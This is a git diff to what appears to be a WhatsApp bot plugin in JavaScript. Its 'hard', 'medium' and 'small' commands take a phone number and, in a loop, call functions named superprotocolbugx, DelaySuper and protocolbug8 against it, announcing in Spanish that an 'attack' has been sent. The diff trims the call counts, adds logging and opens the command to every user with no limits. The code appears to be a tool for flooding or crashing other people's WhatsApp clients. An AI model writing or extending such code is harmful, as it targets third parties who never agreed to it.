@@ -83,6 +83,8 @@ let handler = async (m, { conn, text, command }) => {
     return m.reply(`❌ No se pudo determinar el objetivo.\nUsa el comando así:\n• .${command} 521xxxx\n• o responde a un mensaje\n• o usa en privado`);
   }
 
+  console.log("✅ Comando ejecutado. Objetivo:", target);
+
   await conn.sendMessage(m.chat, {
     text: `🔥 Ataque tipo *${command.toUpperCase()}* enviado a:\n✦ *${target}*\nEspere unos segundos...`,
     mentions: [m.sender]
@@ -90,13 +92,7 @@ let handler = async (m, { conn, text, command }) => {
 
   for (let i = 0; i < 3; i++) {
     await superprotocolbugx(target, true);
-    await superprotocolbugx(target, true);
-    await superprotocolbugx(target, true);
     await DelaySuper(target, true);
-    await DelaySuper(target, true);
-    await DelaySuper(target, true);
-    await protocolbug8(target, true);
-    await protocolbug8(target, true);
     await protocolbug8(target, true);
   }
 
@@ -106,7 +102,12 @@ let handler = async (m, { conn, text, command }) => {
   }, { quoted: m });
 };
 
-handler.command = ['hard', 'medium', 'small']; handler.group = false; handler.premium = false; handler.register = false; handler.limit = false;
+handler.command = ['hard', 'medium', 'small'];
+handler.group = false;
+handler.premium = false;     // ❌ No es premium
+handler.owner = false;       // ❌ No es del creador
+handler.admin = false;       // ❌ No necesita ser admin
+handler.register = false;    // ❌ No necesita estar registrado
+handler.limit = false;       // ❌ Sin límite de uso
 
 export default handler;
-
